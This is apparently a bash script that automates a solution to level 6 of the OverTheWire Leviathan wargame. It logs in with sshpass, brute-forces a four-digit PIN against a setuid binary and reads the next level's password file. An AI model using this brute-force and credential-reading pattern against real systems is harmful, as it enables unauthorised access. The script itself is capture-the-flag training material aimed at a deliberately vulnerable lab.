#! /bin/bash 

# Start program for leviathan

PASS6=$(cat ./level_pass/level6)

tput setab 1; tput setaf 7; echo 'Wait for 1 minute :)'; tput sgr0; 

PASS7=$(sshpass -p "$PASS6" ssh leviathan6@leviathan.labs.overthewire.org -p 2223 "tmux new -d -s asim; tmux send-keys -t asim.0 'for i in {1000..9999}; do ./leviathan6 \$i; done' ENTER; tmux send-keys -t asim.0 'cat /etc/leviathan_pass/leviathan7 > /tmp/ck' ENTER; sleep 90s; tmux kill-session -t asim; cat /tmp/ck")

tput setab 7;tput setaf 1;echo "The password for level7: $PASS7";tput sgr0

echo "$PASS7" > ./level_pass/level7
